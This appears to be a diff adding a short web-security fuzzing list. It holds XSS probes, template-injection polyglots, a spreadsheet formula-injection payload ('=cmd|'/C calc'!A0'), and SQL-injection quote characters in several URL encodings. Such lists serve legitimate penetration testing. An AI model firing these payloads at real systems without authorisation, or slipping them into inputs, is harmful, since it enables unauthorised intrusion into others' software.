@@ -1,0 +1,36 @@
+<script>alert(1)</script>
+“><script>alert(1)</script>
+"`@`)")')`)%>~[]*$;:?^<.{}+-=~\#‘`“‘)`)”)”))’))”)))’)))%3c %253c %u003c \x3c \u003c &lt;
+${{<%[%'"}}%\
+${{<%[%'}}%\
+=cmd|'/C calc'!A0
+'
+%27
+"
+%22
+#
+%23
+;
+%3B
+)
+Wildcard (*)
+%%2727
+%25%27
+
+
+XSS Payloads:
+
+<
+%3c
+%253c
+%u003c
+\x3c
+\u003c
+&lt;
+
+%3cscript
+tag:
+%3c %253c %u003c \x3c \u003c &lt;
+%3c%2b%253c%2b%u003c%2b\x3c%2b\u003c%2b
+quot:
+&quot;
